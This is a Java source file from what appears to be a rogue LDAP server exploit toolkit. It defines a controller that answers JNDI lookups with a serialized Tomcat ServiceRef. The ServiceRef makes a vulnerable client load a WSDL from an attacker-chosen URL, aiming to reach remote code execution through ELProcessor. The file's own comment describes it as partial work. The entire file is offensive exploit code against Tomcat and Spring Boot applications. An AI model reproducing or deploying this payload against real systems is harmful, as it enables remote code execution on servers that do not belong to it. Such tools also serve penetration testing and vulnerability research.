package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ServiceRef;

import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 * This is a partial work whereby which an attempt is made to load a WSDL from an HTTP server
 * and then use this WSDL to trigger RCE.
 * org.apache.naming.factory.webservices.ServiceRefFactory has a getObjectInstance method
 * that is capable of loading a WSDL file. Further there exists exploits that can use WSDL
 *  in combination with ELProcessor to trigger RCE. However, this is only partial work for now.
 * Requires:
 * Tomcat 8+ or SpringBoot 1.2.x+ in classpath
 * - tomcat-embed-core.jar
 * - tomcat-embed-el.jar
 */
@SuppressWarnings("DuplicatedCode")
@LdapMapping(uri = {"/o=tomcat-wsdl"})
public class TomcatWSDL implements LdapController {


    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + "with WSDL payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        ServiceRef serviceRef = new ServiceRef("dummyRefName", "javax.el.ELProcessor", new String[]{"dummyServiceNamespace", "dummyServiceLocalPart"}, "",
                null, "org.apache.naming.factory.webservices.ServiceRefFactory", null);
        serviceRef.add(new StringRefAddr("serviceInterface", "javax.el.ELProcessor"));
        serviceRef.add(new StringRefAddr("wsdl", Config.command));
        e.addAttribute("javaSerializedData", serialize(serviceRef));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
